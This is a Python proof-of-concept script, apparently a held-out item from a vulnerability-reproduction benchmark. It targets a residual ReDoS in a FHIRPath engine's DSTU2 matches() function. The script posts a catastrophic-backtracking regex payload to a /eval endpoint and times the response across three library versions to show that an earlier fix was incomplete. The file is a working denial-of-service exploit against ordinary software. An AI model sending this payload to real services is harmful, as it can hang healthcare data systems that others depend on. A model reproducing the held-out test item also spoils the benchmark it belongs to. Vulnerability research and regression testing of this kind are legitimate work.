#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-55470 residual ReDoS PoC, delivered over EXTERNAL HTTP (dos-threshold; no flag).

The residual: CVE-2026-45367 guarded the DSTU2 FHIRPathEngine replaceMatches() but MISSED DSTU2
matches(), which still calls raw String.matches() on the attacker regex. The SAME catastrophic
regex now reaches java.util.regex through the sibling matches() function. Delivered to the REAL
Java HTTP service (POST /eval); the server-side response latency is measured externally.

  POST /eval {"expr":"matches('(.*a){30}')","input":"a"*250+"X"}

Differential expectation (SERVER-SIDE latency of the external HTTP request, 10s read timeout):
  V0 (6.9.6)  : SLOW  (raw String.matches -> catastrophic -> response HANGS -> ~10000ms)
  V1 (6.9.7)  : SLOW  (INCOMPLETE FIX: DSTU2 matches() still raw -> HANGS -> ~10000ms)  <- RESIDUAL REACHES
  V2 (6.9.10) : FAST  (CVE-2026-55470 wrapped matches() in RegexTimeout.matches ~500ms)  <- CLOSED

The original seed (replaceMatches) is BOUNDED on V1 (~500ms RegexTimeout) while this residual
(matches) HANGS on V1 -> genuine incomplete fix on the same sink family / same evil regex.

Usage: bypass_poc.py http://127.0.0.1:26907
"""
import http.client
import json
import socket
import sys
import time

PAYLOAD = {"expr": "matches('(.*a){30}')", "input": "a" * 250 + "X"}
HTTP_TIMEOUT_S = 10.0


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    body = json.dumps(PAYLOAD)
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/eval", body=body, headers={"Content-Type": "application/json"})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "resp": None}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:26907"
    out = run(base)
    print(json.dumps({"poc": "residual/CVE-2026-55470", "func": "matches",
                      "target": base, **out}, indent=2))
